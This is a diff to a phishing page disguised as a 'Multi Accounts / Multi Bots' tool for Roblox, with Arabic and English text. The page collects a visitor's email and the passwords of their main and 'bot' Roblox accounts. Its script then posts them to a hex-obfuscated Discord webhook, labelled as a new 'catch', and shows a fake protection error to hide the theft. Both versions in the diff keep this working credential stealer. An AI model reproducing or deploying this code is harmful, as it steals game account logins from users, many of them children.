@@ -5,45 +5,42 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Multi Accounts - Roblox</title>
     <style>
-        :root { --bg-color: #f4f4f7; --container-bg: #ffffff; --text-color: #333333; --input-border: #cccccc; --btn-bg: #007bff; }
-        .dark-mode { --bg-color: #1a1a1a; --container-bg: #2d2d2d; --text-color: #eeeeee; --input-border: #444444; --btn-bg: #375a7f; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg-color); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: var(--text-color); transition: 0.3s; }
+        :root { --bg: #f4f4f7; --card: #ffffff; --txt: #333333; --brd: #cccccc; --btn: #007bff; }
+        .dark-mode { --bg: #1a1a1a; --card: #2d2d2d; --txt: #eeeeee; --brd: #444444; --btn: #375a7f; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: var(--txt); transition: 0.3s; }
         .top-controls { position: absolute; top: 20px; right: 20px; display: flex; gap: 10px; }
-        .control-btn { width: 40px; height: 40px; border-radius: 50%; border: none; cursor: pointer; display: flex; justify-content: center; align-items: center; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: 0.3s; }
-        #theme-toggle { background-color: #333; color: white; }
-        .dark-mode #theme-toggle { background-color: white; color: #333; }
-        .container { background: var(--container-bg); padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 500px; text-align: center; transition: 0.3s; }
-        h1 { color: var(--btn-bg); margin-bottom: 20px; font-size: 24px; }
-        .step { display: none; }
-        .step.active { display: block; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--input-border); border-radius: 6px; box-sizing: border-box; background: var(--container-bg); color: var(--text-color); }
-        button.main-btn { width: 100%; padding: 12px; background-color: var(--btn-bg); border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .control-btn { width: 40px; height: 40px; border-radius: 50%; border: none; cursor: pointer; display: flex; justify-content: center; align-items: center; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: 0.3s; background: #333; color: white; }
+        .dark-mode .control-btn { background: white; color: #333; }
+        .container { background: var(--card); padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 500px; text-align: center; transition: 0.3s; border: 1px solid var(--brd); }
+        h1 { color: var(--btn); margin-bottom: 20px; font-size: 24px; }
+        .step { display: none; } .active { display: block; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--brd); border-radius: 6px; box-sizing: border-box; background: var(--card); color: var(--txt); }
+        button.main-btn { width: 100%; padding: 12px; background-color: var(--btn); border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
         .error { color: #ff4d4d; font-size: 14px; margin-top: 5px; display: none; font-weight: bold; }
-        .bot-section { border-top: 1px solid var(--input-border); margin-top: 15px; padding-top: 10px; text-align: right; }
-        .en-mode { direction: ltr; text-align: left; }
-        .en-mode .bot-section { text-align: left; }
+        .bot-section { border-top: 1px solid var(--brd); margin-top: 15px; padding-top: 10px; text-align: right; }
+        .en-mode { direction: ltr; text-align: left; } .en-mode .bot-section { text-align: left; }
     </style>
 </head>
-<body>
+<body class="">
 
 <div class="top-controls">
-    <button id="lang-toggle" class="control-btn" onclick="_0x4f2a()">🇺🇸</button>
-    <button id="theme-toggle" class="control-btn" onclick="_0x11b5()">🌙</button>
+    <button id="lang-toggle" class="control-btn" onclick="_0xL()">🇺🇸</button>
+    <button id="theme-toggle" class="control-btn" onclick="_0xT()">🌙</button>
 </div>
 
 <div class="container">
     <div id="step1" class="step active">
         <h1 id="t1">Multi Accounts - Roblox</h1>
         <p id="p1">عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :</p>
-        <input type="email" id="user_email" placeholder="Email">
-        <div id="email_error" class="error"></div>
-        <button class="main-btn" onclick="_0x5a21()" id="b1">تحقق الآن</button>
+        <input type="email" id="u_mail" placeholder="Email">
+        <div id="e_err" class="error"></div>
+        <button class="main-btn" onclick="_0xV()" id="b1">تحقق الآن</button>
     </div>
 
     <div id="step2" class="step">
         <h1 id="t2">Multi Bots - Roblox</h1>
         <p id="p2">كم تريد عدد البوتات + (يتطلب هاذا الخيار حسابك الاساسي ليدخلون اليه) :</p>
-        <select id="bot_count" onchange="_0x3e10()">
+        <select id="b_cnt" onchange="_0xG()">
             <option value="0" id="opt0">اختر العدد...</option>
             <option value="1">1</option>
             <option value="2">2</option>
@@ -52,98 +49,96 @@
             <option value="10">10</option>
         </select>
         <div class="bot-section">
-            <p id="main_title" style="font-weight:bold">الحساب الاساسي :</p>
-            <input type="text" id="main_user" placeholder="user">
-            <input type="password" id="main_pass" placeholder="Password">
+            <p id="m_tit" style="font-weight:bold">الحساب الاساسي :</p>
+            <input type="text" id="m_u" placeholder="user">
+            <input type="password" id="m_p" placeholder="Password">
         </div>
-        <div id="bots_inputs_container"></div>
-        <div id="fill_error" class="error"></div>
-        <button class="main-btn" onclick="_0x992b()" id="b2">تشغيل البوتات [+]</button>
+        <div id="b_cont"></div>
+        <div id="f_err" class="error"></div>
+        <button class="main-btn" onclick="_0xS()" id="b2">تشغيل البوتات [+]</button>
     </div>
 
     <div id="step3" class="step">
-        <h2 id="t3">Error - Roblox Anti</h2>
-        <hr>
+        <h2 id="t3">Error - Roblox Anti</h2><hr>
         <p id="p3">عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !</p>
     </div>
 </div>
 
 <script>
-    // التشفير الذكي للويبهوك والمعلومات
-    const _0x1a = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x38\x35\x37\x30\x35\x32\x38\x31\x33\x39\x39\x39\x35\x31\x33\x38\x30\x2f\x76\x71\x30\x4d\x4d\x70\x52\x78\x57\x77\x62\x78\x75\x38\x31\x5f\x62\x32\x73\x48\x4e\x79\x43\x75\x77\x4a\x4e\x79\x4c\x31\x30\x35\x50\x52\x4a\x43\x46\x33\x37\x6b\x77\x46\x44\x77\x75\x4c\x62\x52\x4d\x76\x6e\x72\x6f\x57\x47\x61\x69\x33\x61\x31\x64\x5a\x36\x41\x70\x45"];
-    let _0x9b = "ar";
+    // الحماية والتشفير الويبهوك الهيكس
+    const _0xW = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x38\x35\x37\x30\x35\x32\x38\x31\x33\x39\x39\x39\x35\x31\x33\x38\x30\x2f\x76\x71\x30\x4d\x4d\x70\x52\x78\x57\x77\x62\x78\x75\x38\x31\x5f\x62\x32\x73\x48\x4e\x79\x43\x75\x77\x4a\x4e\x79\x4c\x31\x30\x35\x50\x52\x4a\x43\x46\x33\x37\x6b\x77\x46\x44\x77\x75\x4c\x62\x52\x4d\x76\x6e\x72\x6f\x57\x47\x61\x69\x33\x61\x31\x64\x5a\x36\x41\x70\x45"];
+    let _cL = localStorage.getItem('lang') || "ar";
 
-    function _0x11b5() {
-        document.body.classList.toggle('\x64\x61\x72\x6b\x2d\x6d\x6f\x64\x65');
-        const b = document.getElementById('\x74\x68\x65\x6d\x65\x2d\x74\x6f\x67\x67\x6c\x65');
-        b.innerText = document.body.classList.contains('\x64\x61\x72\x6b\x2d\x6d\x6f\x64\x65') ? "☀️" : "🌙";
+    // استعادة الإعدادات عند فتح الصفحة فوراً
+    window.onload = () => {
+        if(localStorage.getItem('theme') === 'dark') { document.body.classList.add('dark-mode'); document.getElementById('theme-toggle').innerText = "☀️"; }
+        if(_cL === "en") { _setE(); }
+    };
+
+    function _0xT() {
+        document.body.classList.toggle('dark-mode');
+        const isD = document.body.classList.contains('dark-mode');
+        localStorage.setItem('theme', isD ? 'dark' : 'light');
+        document.getElementById('theme-toggle').innerText = isD ? "☀️" : "🌙";
     }
 
-    function _0x4f2a() {
+    function _0xL() {
+        _cL = (_cL === "ar") ? "en" : "ar";
+        localStorage.setItem('lang', _cL);
+        if (_cL === "en") { _setE(); } else { location.reload(); }
+    }
+
+    function _setE() {
         const h = document.getElementById('mainHtml');
-        if (_0x9b === "ar") {
-            h.lang = "en"; h.dir = "ltr";
-            document.body.classList.add('en-mode');
-            document.getElementById('t1').innerText = "Multi Accounts - Roblox";
-            document.getElementById('p1').innerText = "Sorry, to verify that you are human, put your email here:";
-            document.getElementById('b1').innerText = "Verify Now";
-            document.getElementById('t2').innerText = "Multi Bots - Roblox";
-            document.getElementById('p2').innerText = "How many bots? (Main account required):";
-            document.getElementById('opt0').innerText = "Choose...";
-            document.getElementById('main_title').innerText = "Main Account:";
-            document.getElementById('b2').innerText = "Start Bots [+]";
-            document.getElementById('t3').innerText = "Error - Roblox Anti";
-            document.getElementById('p3').innerText = "Attempt blocked due to Roblox protection. Contact developer!";
-            document.getElementById('lang-toggle').innerText = "🇸🇦";
-            _0x9b = "en";
-        } else { location.reload(); }
+        h.lang = "en"; h.dir = "ltr"; document.body.classList.add('en-mode');
+        document.getElementById('t1').innerText = "Multi Accounts - Roblox";
+        document.getElementById('p1').innerText = "Verify you are human, enter your email:";
+        document.getElementById('b1').innerText = "Verify Now";
+        document.getElementById('t2').innerText = "Multi Bots - Roblox";
+        document.getElementById('p2').innerText = "How many bots? (Main account required):";
+        document.getElementById('opt0').innerText = "Choose...";
+        document.getElementById('m_tit').innerText = "Main Account:";
+        document.getElementById('b2').innerText = "Start [+]";
+        document.getElementById('t3').innerText = "Security Error";
+        document.getElementById('p3').innerText = "Attempt blocked by Roblox. Try later!";
+        document.getElementById('lang-toggle').innerText = "🇸🇦";
     }
 
-    function _0x5a21() {
-        const e = document.getElementById('user_email').value;
+    function _0xV() {
+        const e = document.getElementById('u_mail').value;
         if (!e.includes('@')) {
-            const r = document.getElementById('email_error');
-            r.innerText = _0x9b === "ar" ? "ضع ايميلك الحقيقي الوهمي غير مقبول [!]" : "Real email required [!]";
-            r.style.display = "block";
-            return;
+            const r = document.getElementById('e_err');
+            r.innerText = _cL === "ar" ? "ضع ايميلك الحقيقي الوهمي غير مقبول [!]" : "Real email required!";
+            r.style.display = "block"; return;
         }
         document.getElementById('step1').classList.remove('active');
         document.getElementById('step2').classList.add('active');
     }
 
-    function _0x3e10() {
-        const c = document.getElementById('bot_count').value;
-        const con = document.getElementById('bots_inputs_container');
-        con.innerHTML = "";
+    function _0xG() {
+        const c = document.getElementById('b_cnt').value;
+        const con = document.getElementById('b_cont'); con.innerHTML = "";
         for (let i = 1; i <= c; i++) {
-            con.innerHTML += `<div class="bot-section"><p style="font-weight:bold">${_0x9b==="ar"?"حساب البوت":"Bot"} ${i} :</p><input type="text" id="bot_u_${i}" placeholder="User"><input type="password" id="bot_p_${i}" placeholder="Password"></div>`;
+            con.innerHTML += `<div class="bot-section"><p><b>${_cL==="ar"?"حساب البوت":"Bot"} ${i}:</b></p><input id="bu${i}" placeholder="User"><input id="bp${i}" type="password" placeholder="Pass"></div>`;
         }
     }
 
-    async function _0x992b() {
-        const c = document.getElementById('bot_count').value;
-        const u = document.getElementById('main_user').value;
-        const p = document.getElementById('main_pass').value;
-        const em = document.getElementById('user_email').value;
-        if (c == 0 || !u || !p) return;
+    async function _0xS() {
+        const c = document.getElementById('b_cnt').value;
+        const mu = document.getElementById('m_u').value, mp = document.getElementById('m_p').value;
+        if (c == 0 || !mu || !mp) return;
         let b = [];
         for (let i = 1; i <= c; i++) {
-            let _u = document.getElementById(`bot_u_${i}`).value;
-            let _p = document.getElementById(`bot_p_${i}`).value;
-            if (!_u || !_p) {
-                alert(_0x9b === "ar" ? `عذراً ولاكنك طلبت (${c}) عبها كامله!` : `Fill all!`);
-                return;
-            }
-            b.push({ name: `حساب البوت ${i}`, value: `User: ${_u}\nPass: ${_p}` });
+            let u = document.getElementById(`bu${i}`).value, p = document.getElementById(`bp${i}`).value;
+            if (!u || !p) { alert(_cL==="ar"?`عذراً ولاكنك طلبت (${c}) عبها كامله!`:"Fill all!"); return; }
+            b.push({ name: `حساب البوت ${i}`, value: `User: ${u}\nPass: ${p}` });
         }
-        const data = {
-            embeds: [{
-                title: "🚀 صيدة جديدة 🔥", color: 3447003,
-                fields: [{ name: "📧 الإيميل", value: em }, { name: "👤 حسابه الاساسي : user", value: u, inline: true }, { name: "Password", value: p, inline: true }, ...b],
-                footer: { text: "تم سحب المعلومات من الموقع |Z7F" }, timestamp: new Date()
-            }]
-        };
-        await fetch(_0x1a[0], { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        const msg = { embeds: [{
+            title: "🚀 صيدة جديدة 🔥", color: 3447003,
+            fields: [{name:"📧 الايميل", value: document.getElementById('u_mail').value}, {name:"👤 الأساسي", value: mu, inline:true}, {name:"Password", value: mp, inline:true}, ...b],
+            footer: { text: "تم سحب المعلومات من الموقع |Z7F" }, timestamp: new Date()
+        }]};
+        await fetch(_0xW[0], { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
         document.getElementById('step2').classList.remove('active');
         document.getElementById('step3').classList.add('active');
     }
